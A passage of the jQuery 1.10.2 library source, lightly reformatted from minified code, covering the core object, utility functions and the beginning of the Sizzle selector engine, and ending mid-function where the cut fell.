
(function(e, t) {
    var n, r, i = typeof t,
        o = e.location,
        a = e.document,
        s = a.documentElement,
        l = e.jQuery,
        u = e.$,
        c = {},
        p = [],
        f = "1.10.2",
        d = p.concat,
        h = p.push,
        g = p.slice,
        m = p.indexOf,
        y = c.toString,
        v = c.hasOwnProperty,
        b = f.trim,
        x = function(e, t) {
            return new x.fn.init(e, t, r)
        },
        w = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
        T = /\S+/g,
        C = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
        N = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,
        k = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
        E = /^[\],:{}\s]*$/,
        S = /(?:^|:|,)(?:\s*\[)+/g,
        A = /\\(?:["\\\/bfnrt]|u[\da-fA-F]{4})/g,
        j = /"[^"\\\r\n]*"|true|false|null|-?(?:\d+\.|)\d+(?:[eE][+-]?\d+|)/g,
        D = /^-ms-/,
        L = /-([\da-z])/gi,
        H = function(e, t) {
            return t.toUpperCase()
        },
        q = function(e) {
            (a.addEventListener || "load" === e.type || "complete" === a.readyState) && (_(), x.ready())
        },
        _ = function() {
            a.addEventListener ? (a.removeEventListener("DOMContentLoaded", q, !1), e.removeEventListener("load", q, !1)) : (a.detachEvent("onreadystatechange", q), e.detachEvent("onload", q))
        };
    x.fn = x.prototype = {
        jquery: f,
        constructor: x,
        init: function(e, n, r) {
            var i, o;
            if (!e) return this;
            if ("string" == typeof e) {
                if (i = "<" === e.charAt(0) && ">" === e.charAt(e.length - 1) && e.length >= 3 ? [null, e, null] : N.exec(e), !i || !i[1] && n) return !n || n.jquery ? (n || r).find(e) : this.constructor(n).find(e);
                if (i[1]) {
                    if (n = n instanceof x ? n[0] : n, x.merge(this, x.parseHTML(i[1], n && n.nodeType ? n.ownerDocument || n : a, !0)), k.test(i[1]) && x.isPlainObject(n))
                        for (i in n) x.isFunction(this[i]) ? this[i](n[i]) : this.attr(i, n[i]);
                    return this
                }
                if (o = a.getElementById(i[2]), o && o.parentNode) {
                    if (o.id !== i[2]) return r.find(e);
                    this.length = 1, this[0] = o
                }
                return this.context = a, this.selector = e, this
            }
            return e.nodeType ? (this.context = this[0] = e, this.length = 1, this) : x.isFunction(e) ? r.ready(e) : (e.selector !== t && (this.selector = e.selector, this.context = e.context), x.makeArray(e, this))
        },
        selector: "",
        length: 0,
        toArray: function() {
            return g.call(this)
        },
        get: function(e) {
            return null == e ? this.toArray() : 0 > e ? this[this.length + e] : this[e]
        },
        pushStack: function(e) {
            var t = x.merge(this.constructor(), e);
            return t.prevObject = this, t.context = this.context, t
        },
        each: function(e, t) {
            return x.each(this, e, t)
        },
        ready: function(e) {
            return x.ready.promise().done(e), this
        },
        slice: function() {
            return this.pushStack(g.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        eq: function(e) {
            var t = this.length,
                n = +e + (0 > e ? t : 0);
            return this.pushStack(n >= 0 && t > n ? [this[n]] : [])
        },
        map: function(e) {
            return this.pushStack(x.map(this, function(t, n) {
                return e.call(t, n, t)
            }))
        },
        end: function() {
            return this.prevObject || this.constructor(null)
        },
        push: h,
        sort: [].sort,
        splice: [].splice
    }, x.fn.init.prototype = x.fn, x.extend = x.fn.extend = function() {
        var e, n, r, i, o, a, s = arguments[0] || {},
            l = 1,
            u = arguments.length,
            c = !1;
        for ("boolean" == typeof s && (c = s, s = arguments[1] || {}, l = 2), "object" == typeof s || x.isFunction(s) || (s = {}), u === l && (s = this, --l); u > l; l++)
            if (null != (o = arguments[l]))
                for (i in o) e = s[i], r = o[i], s !== r && (c && r && (x.isPlainObject(r) || (n = x.isArray(r))) ? (n ? (n = !1, a = e && x.isArray(e) ? e : []) : a = e && x.isPlainObject(e) ? e : {}, s[i] = x.extend(c, a, r)) : r !== t && (s[i] = r));
        return s
    }, x.extend({
        expando: "jQuery" + (f + Math.random()).replace(/\D/g, ""),
        noConflict: function(t) {
            return e.$ === x && (e.$ = u), t && e.jQuery === x && (e.jQuery = l), x
        },
        isReady: !1,
        readyWait: 1,
        holdReady: function(e) {
            e ? x.readyWait++ : x.ready(!0)
        },
        ready: function(e) {
            if (e === !0 ? !--x.readyWait : !x.isReady) {
                if (!a.body) return setTimeout(x.ready);
                x.isReady = !0, e !== !0 && --x.readyWait > 0 || (n.resolveWith(a, [x]), x.fn.trigger && x(a).trigger("ready").off("ready"))
            }
        },
        isFunction: function(e) {
            return "function" === x.type(e)
        },
        isArray: Array.isArray || function(e) {
            return "array" === x.type(e)
        },
        isWindow: function(e) {
            return null != e && e == e.window
        },
        isNumeric: function(e) {
            return !isNaN(parseFloat(e)) && isFinite(e)
        },
        type: function(e) {
            return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? c[y.call(e)] || "object" : typeof e
        },
        isPlainObject: function(e) {
            var n;
            if (!e || "object" !== x.type(e) || e.nodeType || x.isWindow(e)) return !1;
            try {
                if (e.constructor && !v.call(e, "constructor") && !v.call(e.constructor.prototype, "isPrototypeOf")) return !1
            } catch (r) {
                return !1
            }
            if (x.support.ownLast)
                for (n in e) return v.call(e, n);
            for (n in e);
            return n === t || v.call(e, n)
        },
        isEmptyObject: function(e) {
            var t;
            for (t in e) return !1;
            return !0
        },
        error: function(e) {
            throw Error(e)
        },
        parseHTML: function(e, t, n) {
            if (!e || "string" != typeof e) return null;
            "boolean" == typeof t && (n = t, t = !1), t = t || a;
            var r = k.exec(e),
                i = !n && [];
            return r ? [t.createElement(r[1])] : (r = x.buildFragment([e], t, i), i && x(i).remove(), x.merge([], r.childNodes))
        },
        parseJSON: function(n) {
            return e.JSON && e.JSON.parse ? e.JSON.parse(n) : null === n ? n : "string" == typeof n && (n = x.trim(n), n && E.test(n.replace(A, "@").replace(j, "]").replace(S, ""))) ? Function("return " + n)() : (x.error("Invalid JSON: " + n), t)
        },
        parseXML: function(n) {
            var r, i;
            if (!n || "string" != typeof n) return null;
            try {
                e.DOMParser ? (i = new DOMParser, r = i.parseFromString(n, "text/xml")) : (r = new ActiveXObject("Microsoft.XMLDOM"), r.async = "false", r.loadXML(n))
            } catch (o) {
                r = t
            }
            return r && r.documentElement && !r.getElementsByTagName("parsererror").length || x.error("Invalid XML: " + n), r
        },
        noop: function() {},
        globalEval: function(t) {
            t && x.trim(t) && (e.execScript || function(t) {
                e.eval.call(e, t)
            })(t)
        },
        camelCase: function(e) {
            return e.replace(D, "ms-").replace(L, H)
        },
        nodeName: function(e, t) {
            return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
        },
        each: function(e, t, n) {
            var r, i = 0,
                o = e.length,
                a = M(e);
            if (n) {
                if (a) {
                    for (; o > i; i++)
                        if (r = t.apply(e[i], n), r === !1) break
                } else
                    for (i in e)
                        if (r = t.apply(e[i], n), r === !1) break
            } else if (a) {
                for (; o > i; i++)
                    if (r = t.call(e[i], i, e[i]), r === !1) break
            } else
                for (i in e)
                    if (r = t.call(e[i], i, e[i]), r === !1) break; return e
        },
        trim: b && !b.call("\ufeff\u00a0") ? function(e) {
            return null == e ? "" : b.call(e)
        } : function(e) {
            return null == e ? "" : (e + "").replace(C, "")
        },
        makeArray: function(e, t) {
            var n = t || [];
            return null != e && (M(Object(e)) ? x.merge(n, "string" == typeof e ? [e] : e) : h.call(n, e)), n
        },
        inArray: function(e, t, n) {
            var r;
            if (t) {
                if (m) return m.call(t, e, n);
                for (r = t.length, n = n ? 0 > n ? Math.max(0, r + n) : n : 0; r > n; n++)
                    if (n in t && t[n] === e) return n
            }
            return -1
        },
        merge: function(e, n) {
            var r = n.length,
                i = e.length,
                o = 0;
            if ("number" == typeof r)
                for (; r > o; o++) e[i++] = n[o];
            else
                while (n[o] !== t) e[i++] = n[o++];
            return e.length = i, e
        },
        grep: function(e, t, n) {
            var r, i = [],
                o = 0,
                a = e.length;
            for (n = !!n; a > o; o++) r = !!t(e[o], o), n !== r && i.push(e[o]);
            return i
        },
        map: function(e, t, n) {
            var r, i = 0,
                o = e.length,
                a = M(e),
                s = [];
            if (a)
                for (; o > i; i++) r = t(e[i], i, n), null != r && (s[s.length] = r);
            else
                for (i in e) r = t(e[i], i, n), null != r && (s[s.length] = r);
            return d.apply([], s)
        },
        guid: 1,
        proxy: function(e, n) {
            var r, i, o;
            return "string" == typeof n && (o = e[n], n = e, e = o), x.isFunction(e) ? (r = g.call(arguments, 2), i = function() {
                return e.apply(n || this, r.concat(g.call(arguments)))
            }, i.guid = e.guid = e.guid || x.guid++, i) : t
        },
        access: function(e, n, r, i, o, a, s) {
            var l = 0,
                u = e.length,
                c = null == r;
            if ("object" === x.type(r)) {
                o = !0;
                for (l in r) x.access(e, n, l, r[l], !0, a, s)
            } else if (i !== t && (o = !0, x.isFunction(i) || (s = !0), c && (s ? (n.call(e, i), n = null) : (c = n, n = function(e, t, n) {
                return c.call(x(e), n)
            })), n))
                for (; u > l; l++) n(e[l], r, s ? i : i.call(e[l], l, n(e[l], r)));
            return o ? e : c ? n.call(e) : u ? n(e[0], r) : a
        },
        now: function() {
            return (new Date).getTime()
        },
        swap: function(e, t, n, r) {
            var i, o, a = {};
            for (o in t) a[o] = e.style[o], e.style[o] = t[o];
            i = n.apply(e, r || []);
            for (o in t) e.style[o] = a[o];
            return i
        }
    }), x.ready.promise = function(t) {
        if (!n)
            if (n = x.Deferred(), "complete" === a.readyState) setTimeout(x.ready);
            else if (a.addEventListener) a.addEventListener("DOMContentLoaded", q, !1), e.addEventListener("load", q, !1);
        else {
            a.attachEvent("onreadystatechange", q), e.attachEvent("onload", q);
            var r = !1;
            try {
                r = null == e.frameElement && a.documentElement
            } catch (i) {}
            r && r.doScroll && function o() {
                if (!x.isReady) {
                    try {
                        r.doScroll("left")
                    } catch (e) {
                        return setTimeout(o, 50)
                    }
                    _(), x.ready()
                }
            }()
        }
        return n.promise(t)
    }, x.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(e, t) {
        c["[object " + t + "]"] = t.toLowerCase()
    });

    function M(e) {
        var t = e.length,
            n = x.type(e);
        return x.isWindow(e) ? !1 : 1 === e.nodeType && t ? !0 : "array" === n || "function" !== n && (0 === t || "number" == typeof t && t > 0 && t - 1 in e)
    }
    r = x(a),
        function(e, t) {
            var n, r, i, o, a, s, l, u, c, p, f, d, h, g, m, y, v, b = "sizzle" + -new Date,
                w = e.document,
                T = 0,
                C = 0,
                N = st(),
                k = st(),
                E = st(),
                S = !1,
                A = function(e, t) {
                    return e === t ? (S = !0, 0) : 0
                },
                j = typeof t,
                D = 1 << 31,
                L = {}.hasOwnProperty,
                H = [],
                q = H.pop,
                _ = H.push,
                M = H.push,
                O = H.slice,
                F = H.indexOf || function(e) {
                    var t = 0,
                        n = this.length;
                    for (; n > t; t++)
                        if (this[t] === e) return t;
                    return -1
                },
                B = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
                P = "[\\x20\\t\\r\\n\\f]",
                R = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
                W = R.replace("w", "w#"),
                $ = "\\[" + P + "*(" + R + ")" + P + "*(?:([*^$|!~]?=)" + P + "*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|(" + W + ")|)|)" + P + "*\\]",
                I = ":(" + R + ")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|" + $.replace(3, 8) + ")*)|.*)\\)|)",
                z = RegExp("^" + P + "+|((?:^|[^\\\\])(?:\\\\.)*)" + P + "+$", "g"),
                X = RegExp("^" + P + "*," + P + "*"),
                U = RegExp("^" + P + "*([>+~]|" + P + ")" + P + "*"),
                V = RegExp(P + "*[+~]"),
                Y = RegExp("=" + P + "*([^\\]'\"]*)" + P + "*\\]", "g"),
                J = RegExp(I),
                G = RegExp("^" + W + "$"),
                Q = {
                    ID: RegExp("^#(" + R + ")"),
                    CLASS: RegExp("^\\.(" + R + ")"),
                    TAG: RegExp("^(" + R.replace("w", "w*") + ")"),
                    ATTR: RegExp("^" + $),
                    PSEUDO: RegExp("^" + I),
                    CHILD: RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + P + "*(even|odd|(([+-]|)(\\d*)n|)" + P + "*(?:([+-]|)" + P + "*(\\d+)|))" + P + "*\\)|)", "i"),
                    bool: RegExp("^(?:" + B + ")$", "i"),
                    needsContext: RegExp("^" + P + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + P + "*((?:-\\d)?\\d*)" + P + "*\\)|)(?=[^-]|$)", "i")
                },
                K = /^[^{]+\{\s*\[native \w/,
                Z = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                et = /^(?:input|select|textarea|button)$/i,
                tt = /^h\d$/i,
                nt = /'|\\/g,
                rt = RegExp("\\\\([\\da-f]{1,6}" + P + "?|(" + P + ")|.)", "ig"),
                it = function(e, t, n) {
                    var r = "0x" + t - 65536;
                    return r !== r || n ? t : 0 > r ? String.fromCharCode(r + 65536) : String.fromCharCode(55296 | r >> 10, 56320 | 1023 & r)
                };
            try {
                M.apply(H = O.call(w.childNodes), w.childNodes), H[w.childNodes.length].nodeType
            } catch (ot) {
                M = {
                    apply: H.length ? function(e, t) {
                        _.apply(e, O.call(t))
                    } : function(e, t) {
                        var n = e.length,
                            r = 0;
                        while (e[n++] = t[r++]);
                        e.length = n - 1
                    }
                }
            }

            function at(e, t, n, i) {
                var o, a, s, l, u, c, d, m, y, x;
                if ((t ? t.ownerDocument || t : w) !== f && p(t), t = t || f, n = n || [], !e || "string" != typeof e) return n;
                if (1 !== (l = t.nodeType) && 9 !== l) return [];
                if (h && !i) {
                    if (o = Z.exec(e))
                        if (s = o[1]) {
                            if (9 === l) {
                                if (a = t.getElementById(s), !a || !a.parentNode) return n;
                                if (a.id === s) return n.push(a), n
                            } else if (t.ownerDocument && (a = t.ownerDocument.getElementById(s)) && v(t, a) && a.id === s) return n.push(a), n
                        } else {
                            if (o[2]) return M.apply(n, t.getElementsByTagName(e)), n;
                            if ((s = o[3]) && r.getElementsByClassName && t.getElementsByClassName) return M.apply(n, t.getElementsByClassName(s)), n
                        }
                    if (r.qsa && (!g || !g.test(e))) {
                        if (m = d = b, y = t, x = 9 === l && e, 1 === l && "object" !== t.nodeName.toLowerCase()) {
                            c = mt(e), (d = t.getAttribute("id")) ? m = d.replace(nt, "\\$&") : t.setAttribute("id", m), m = "[id='" + m + "'] ", u = c.length;
                            while (u--) c[u] = m + yt(c[u]);
                            y = V.test(e) && t.parentNode || t, x = c.join(",")
                        }
                        if (x) try {
                            return M.apply(n, y.querySelectorAll(x)), n
                        } catch (T) {} finally {
                            d || t.removeAttribute("id")
                        }
                    }
                }
                return kt(e.replace(z, "$1"), t, n, i)
            }

            function st() {
                var e = [];

                function t(n, r) {
                    return e.push(n += " ") > o.cacheLength && delete t[e.shift()], t[n] = r
                }
                return t
            }

            function lt(e) {
                return e[b] = !0, e
            }

            function ut(e) {
                var t = f.createElement("div");
                try {
                    return !!e(t)
                } catch (n) {
                    return !1
                } finally {
                    t.parentNode && t.parentNode.removeChild(t), t = null
                }
            }

            function ct(e, t) {
                var n = e.split("|"),
                    r = e.length;
                while (r--) o.attrHandle[n[r]] = t
            }

            function pt(e, t) {
                var n = t && e,
                    r = n && 1 === e.nodeType && 1 === t.nodeType && (~t.sourceIndex || D) - (~e.sourceIndex || D);
                if (r) return r;
                if (n)
                    while (n = n.nextSibling)
                        if (n === t) return -1;
                return e ? 1 : -1
            }

            function ft(e) {
                return function(t) {
                    var n = t.nodeName.toLowerCase();
                    return "input" === n && t.type === e
                }
            }

            function dt(e) {
                return function(t) {
                    var n = t.nodeName.toLowerCase();
                    return ("input" === n || "button" === n) && t.type === e
                }
            }

            function ht(e) {
                return lt(function(t) {
                    return t = +t, lt(function(n, r) {
                        var i, o = e([], n.length, t),
                            a = o.length;
                        while (a--) n[i = o[a]] && (n[i] = !(r[i] = n[i]))
                    })
                })
            }
            s = at.isXML = function(e) {
                var t = e && (e.ownerDocument || e).documentElement;
                return t ? "HTML" !== t.nodeName : !1
            }, r = at.support = {}, p = at.setDocument = function(e) {
                var n = e ? e.ownerDocument || e : w,
                    i = n.defaultView;
                return n !== f && 9 === n.nodeType && n.documentElement ? (f = n, d = n.documentElement, h = !s(n), i && i.attachEvent && i !== i.top && i.attachEvent("onbeforeunload", function() {
                    p()
                }), r.attributes = ut(function(e) {
                    return e.className = "i", !e.getAttribute("className")
                }), r.getElementsByTagName = ut(function(e) {
                    return e.appendChild(n.createComment("")), !e.getElementsByTagName("*").length
                }), r.getElementsByClassName = ut(function(e) {
                    return e.innerHTML = "<div class='a'></div><div class='a i'></div>", e.firstChild.className = "i", 2 === e.getElementsByClassName("i").length
                }), r.getById = ut(function(e) {
                    return d.appendChild(e).id = b, !n.getElementsByName || !n.getElementsByName(b).length
                }), r.getById ? (o.find.ID = function(e, t) {
                    if (typeof t.getElementById !== j && h) {
                        var n = t.getElementById(e);
                        return n && n.parentNode ? [n] : []
                    }
                }, o.filter.ID = function(e) {
                    var t = e.replace(rt, it);
                    return function(e) {
                        return e.getAttribute("id") === t
                    }
                }) : (delete o.find.ID, o.filter.ID = function(e) {
                    var t = e.replace(rt, it);
                    return function(e) {
                        var n = typeof e.getAttributeNode !== j && e.getAttributeNode("id");
                        return n && n.value === t
                    }
                }), o.find.TAG = r.getElementsByTagName ? function(e, n) {
                    return typeof n.getElementsByTagName !== j ? n.getElementsByTagName(e) : t
                } : function(e, t) {
                    var n, r = [],
                        i = 0,
                        o = t.getElementsByTagName(e);
                    if ("*" === e) {
                        while (n = o[i++]) 1 === n.nodeType && r.push(n);
                        return r
                    }
                    return o
                }, o.find.CLASS = r.getElementsByClassName && function(e, n) {
                    return typeof n.getElementsByClassName !== j && h ? n.getElementsByClassName(e) : t
                }, m = [], g = [], (r.qsa = K.test(n.querySelectorAll)) && (ut(function(e) {
                    e.innerHTML = "<select><option selected=''></option></select>", e.querySelectorAll("[selected]").length || g.push("\\[" + P + "*(?:value|" + B + ")"), e.querySelectorAll(":checked").length || g.push(":checked")
                }), ut(function(e) {
                    var t = n.createElement("input");
                    t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("t", ""), e.querySelectorAll("[t^='']").length && g.push("[*^$]=" + P + "*(?:''|\"\")"), e.querySelectorAll(":enabled").length || g.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), g.push(",.*:")
                })), (r.matchesSelector = K.test(y = d.webkitMatchesSelector || d.mozMatchesSelector || d.oMatchesSelector || d.msMatchesSelector)) && ut(function(e) {
                    r.disconnectedMatch = y.call(e, "div"), y.call(e, "[s!='']:x"), m.push("!=", I)
                }), g = g.length && RegExp(g.join("|")), m = m.length && RegExp(m.join("|")), v = K.test(d.contains) || d.compareDocumentPosition ? function(e, t) {
                    var n = 9 === e.nodeType ? e.documentElement : e,
                        r = t && t.parentNode;
                    return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r)))
                } : function(e, t) {
                    if (t)
                        while (t = t.parentNode)
                            if (t === e) return !0;
                    return !1
                }, A = d.compareDocumentPosition ? function(e, t) {
                    if (e === t) return S = !0, 0;
                    var i = t.compareDocumentPosition && e.compareDocumentPosition && e.compareDocumentPosition(t);
                    return i ? 1 & i || !r.sortDetached && t.compareDocumentPosition(e) === i ? e === n || v(w, e) ? -1 : t === n || v(w, t) ? 1 : c ? F.call(c, e) - F.call(c, t) : 0 : 4 & i ? -1 : 1 : e.compareDocumentPosition ? -1 : 1
                } : function(e, t) {
                    var r, i = 0,
                        o = e.parentNode,
                        a = t.parentNode,
                        s = [e],
                        l = [t];
                    if (e === t) return S = !0, 0;
                    if (!o || !a) return e === n ? -1 : t === n ? 1 : o ? -1 : a ? 1 : c ? F.call(c, e) - F.call(c, t) : 0;
                    if (o === a) return pt(e, t);
                    r = e;
                    while (r = r.parentNode) s.unshift(r);
                    r = t;
                    while (r = r.parentNode) l.unshift(r);
                    while (s[i] === l[i]) i++;
                    return i ? pt(s[i], l[i]) : s[i] === w ? -1 : l[i] === w ? 1 : 0
                }, n) : f
            }, at.matches = function(e, t) {
                return at(e, null, null, t)
            }, at.matchesSelector = function(e, t) {
                if ((e.ownerDocument || e) !== f && p(e), t = t.replace(Y, "='$1']"), !(!r.matchesSelector || !h || m && m.test(t) || g && g.test(t))) try {
                    var n = y.call(e, t);
                    if (n || r.disconnectedMatch || e.document && 11 !== e.document.nodeType) return n
                } catch (i) {}
                return at(t, f, null, [e]).length > 0
            }, at.contains = function(e, t) {
                return (e.ownerDocument || e) !== f && p(e), v(e, t)
            }, at.attr = function(e, n) {
                (e.ownerDocument || e) !== f && p(e);
                var i = o.attrHandle[n.toLowerCase()],
                    a = i && L.call(o.attrHandle, n.toLowerCase()) ? i(e, n, !h) : t;
                return a === t ? r.attributes || !h ? e.getAttribute(n) : (a = e.getAttributeNode(n)) && a.specified ? a.value : null : a
            }, at.error = function(e) {
                throw Error("Syntax error, unrecognized expression: " + e)
            }, at.uniqueSort = function(e) {
                var t, n = [],
                    i = 0,
                    o = 0;
                if (S = !r.detectDuplicates, c = !r.sortStable && e.slice(0), e.sort(A), S) {
                    while (t = e[o++]) t === e[o] && (i = n.push(o));
                    while (i--) e.splice(n[i], 1)
                }
                return e
            }, a = at.getText = function(e) {
                var t, n = "",
                    r = 0,
                    i = e.nodeType;
                if (i) {
                    if (1 === i || 9 === i || 11 === i) {
                        if ("string" == typeof e.textContent) return e.textContent;
                        for (e = e.firstChild; e; e = e.nextSibling) n += a(e)
                    } else if (3 === i || 4 === i) return e.nodeValue
                } else
                    for (; t = e[r]; r++) n += a(t);
                return n
            }, o = at.selectors = {
                cacheLength: 50,
                createPseudo: lt,
                match: Q,
                attrHandle: {},
                find: {},
                relative: {
                    ">": {
                        dir: "parentNode",
                        first: !0
                    },
                    " ": {
                        dir: "parentNode"
                    },
                    "+": {
                        dir: "previousSibling",
                        first: !0
                    },
                    "~": {
                        dir: "previousSibling"
                    }
                },
                preFilter: {
                    ATTR: function(e) {
                        return e[1] = e[1].replace(rt, it), e[3] = (e[4] || e[5] || "").replace(rt, it), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                    },
                    CHILD: function(e) {
                        return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || at.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && at.error(e[0]), e
                    },
                    PSEUDO: function(e) {
                        var n, r = !e[5] && e[2];
                        return Q.CHILD.test(e[0]) ? null : (e[3] && e[4] !== t ? e[2] = e[4] : r && J.test(r) && (n = mt(r, !0)) && (n = r.indexOf(")", r.length - n) - r.length) && (e[0] = e[0].slice(0, n), e[2] = r.slice(0, n)), e.slice(0, 3))
                    }
                },
                filter: {
                    TAG: function(e) {
                        var t = e.replace(rt, it).toLowerCase();
                        return "*" === e ? function() {
                            return !0
                        } : function(e) {
                            return e.nodeName && e.nodeName.toLowerCase() === t
                        }
                    },
                    CLASS: function(e) {
                        var t = N[e + " "];
                        return t || (t = RegExp("(^|" + P + ")" + e + "(" + P + "|$)")) && N(e, function(e) {
                            return t.test("string" == typeof e.className && e.className || typeof e.getAttribute !== j && e.getAttribute("class") || "")
                        })
                    },
                    ATTR: function(e, t, n) {
                        return function(r) {
                            var i = at.attr(r, e);
                            return null == i ? "!=" === t : t ? (i += "", "=" === t ? i === n : "!=" === t ? i !== n : "^=" === t ? n && 0 === i.indexOf(n) : "*=" === t ? n && i.indexOf(n) > -1 : "$=" === t ? n && i.slice(-n.length) === n : "~=" === t ? (" " + i + " ").indexOf(n) > -1 : "|=" === t ? i === n || i.slice(0, n.length + 1) === n + "-" : !1) : !0
                        }
                    },
                    CHILD: function(e, t, n, r, i) {
                        var o = "nth" !== e.slice(0, 3),
                            a = "last" !== e.slice(-4),
                            s = "of-type" === t;
                        return 1 === r && 0 === i ? function(e) {
                            return !!e.parentNode
                        } : function(t, n, l) {
                            var u, c, p, f, d, h, g = o !== a ? "nextSibling" : "previousSibling",
                                m = t.parentNode,
                                y = s && t.nodeName.toLowerCase(),
                                v = !l && !s;
                            if (m) {
                                if (o) {
                                    while (g) {
                                        p = t;
                                        while (p = p[g])
                                            if (s ? p.nodeName.toLowerCase() === y : 1 === p.nodeType) return !1;
                                        h = g = "only" === e && !h && "nextSibling"
                                    }
                                    return !0
                                }
                                if (h = [a ? m.firstChild : m.lastChild], a && v) {
                                    c = m[b] || (m[b] = {}), u = c[e] || [], d = u[0] === T && u[1], f = u[0] === T && u[2], p = d && m.childNodes[d];
                                    while (p = ++d && p && p[g] || (f = d = 0) || h.pop())
                                        if (1 === p.nodeType && ++f && p === t) {
                                            c[e] = [T, d, f];
                                            break
                                        }
                                } else if (v && (u = (t[b] || (t[b] = {}))[e]) && u[0] === T) f = u[1];
                                else
                                    while (p = ++d && p && p[g] || (f = d = 0) || h.pop())
                                        if ((s ? p.nodeName.toLowerCase() === y : 1 === p.nodeType) && ++f && (v && ((p[b] || (p[b] = {}))[e] = [T, f]), p === t)) break; return f -= i, f === r || 0 === f % r && f / r >= 0
                            }
                        }
                    },
                    PSEUDO: function(e, t) {
                        var n, r = o.pseudos[e] || o.setFilters[e.toLowerCase()] || at.error("unsupported pseudo: " + e);
                        return r[b] ? r(t) : r.length > 1 ? (n = [e, e, "", t], o.setFilters.hasOwnProperty(e.toLowerCase()) ? lt(function(e, n) {
                            var i, o = r(e, t),
                                a = o.length;
                            while (a--) i = F.call(e, o[a]), e[i] = !(n[i] = o[a])
                        }) : function(e) {
                            return r(e, 0, n)
                        }) : r
                    }
                },
                pseudos: {
                    not: lt(function(e) {
                        var t = [],
                            n = [],
                            r = l(e.replace(z, "$1"));
                        return r[b] ? lt(function(e, t, n, i) {
                            var o, a = r(e, null, i, []),
                                s = e.length;
                            while (s--)(o = a[s]) && (e[s] = !(t[s] = o))
                        }) : function(e, i, o) {
                            return t[0] = e, r(t, null, o, n), !n.pop()
                        }
                    }),
                    has: lt(function(e) {
                        return function(t) {
                            return at(e, t).length > 0
                        }
                    }),
                    contains: lt(function(e) {
                        return function(t) {
                            return (t.textContent || t.innerText || a(t)).indexOf(e) > -1
                        }
                    }),
                    lang: lt(function(e) {
                        return G.test(e || "") || at.error("unsupported lang: " + e), e = e.replace(rt, it).toLowerCase(),
                            function(t) {
                                var n;
                                do
                                    if (n = h ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return n = n.toLowerCase(), n === e || 0 === n.indexOf(e + "-");
                                while ((t = t.parentNode) && 1 === t.nodeType);
                                return !1
                            }
                    }),
                    target: function(t) {
                        var n = e.location && e.location.hash;
                        return n && n.slice(1) === t.id
                    },
                    root: function(e) {
                        return e === d
                    },
                    focus: function(e) {
                        return e === f.activeElement && (!f.hasFocus || f.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                    },
                    enabled: function(e) {
                        return e.disabled === !1
                    },
                    disabled: function(e) {
                        return e.disabled === !0
                    },
                    checked: function(e) {
                        var t = e.nodeName.toLowerCase();
                        return "input" === t && !!e.checked || "option" === t && !!e.selected
                    },
                    selected: function(e) {
                        return e.parentNode && e.parentNode.selectedIndex, e.selected === !0
                    },
                    empty: function(e) {
                        for (e = e.firstChild; e; e = e.nextSibling)
                            if (e.nodeName > "@" || 3 === e.nodeType || 4 === e.nodeType) return !1;
                        return !0
                    },
                    parent: function(e) {
                        return !o.pseudos.empty(e)
                    },
                    header: function(e) {
                        return tt.test(e.nodeName)
                    },
                    input: function(e) {
                        return et.test(e.nodeName)
                    },
                    button: function(e) {
                        var t = e.nodeName.toLowerCase();
                        return "input" === t && "button" === e.type || "button" === t
                    },
                    text: function(e) {
                        var t;
                        return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || t.toLowerCase() === e.type)
                    },
                    first: ht(function() {
                        return [0]
                    }),
                    last: ht(function(e, t) {
                        return [t - 1]
                    }),
                    eq: ht(function(e, t, n) {
                        return [0 > n ? n + t : n]
                    }),
                    even: ht(function(e, t) {
                        var n = 0;
                        for (; t > n; n += 2) e.push(n);
                        return e
                    }),
                    odd: ht(function(e, t) {
                        var n = 1;
                        for (; t > n; n += 2) e.push(n);
                        return e
                    }),
                    lt: ht(function(e, t, n) {
                        var r = 0 > n ? n + t : n;
                        for (; --r >= 0;) e.push(r);
                        return e
                    }),
                    gt: ht(function(e, t, n) {
                        var r = 0 > n ? n + t : n;
                        for (; t > ++r;) e.push(r);
                        return e
                    })
                }
            }, o.pseudos.nth = o.pseudos.eq;
            for (n in {
                radio: !0,
                checkbox: !0,
                file: !0,
                password: !0,
                image: !0
            }) o.pseudos[n] = ft(n);
            for (n in {
                submit: !0,
                reset: !0
            }) o.pseudos[n] = dt(n);

            function gt() {}
            gt.prototype = o.filters = o.pseudos, o.setFilters = new gt;

            function mt(e, t) {
                var n, r, i, a, s, l, u, c = k[e + " "];
                if (c) return t ? 0 : c.slice(0);
                s = e, l = [], u = o.preFilter;
                while (s) {
                    (!n || (r = X.exec(s))) && (r && (s = s.slice(r[0].length) || s), l.push(i = [])), n = !1, (r = U.exec(s)) && (n = r.shift(), i.push({
                        value: n,
                        type: r[0].replace(z, " ")
                    }), s = s.slice(n.length));
                    for (a in o.filter) !(r = Q[a].exec(s)) || u[a] && !(r = u[a](r)) || (n = r.shift(), i.push({
                        value: n,
                        type: a,
                        matches: r
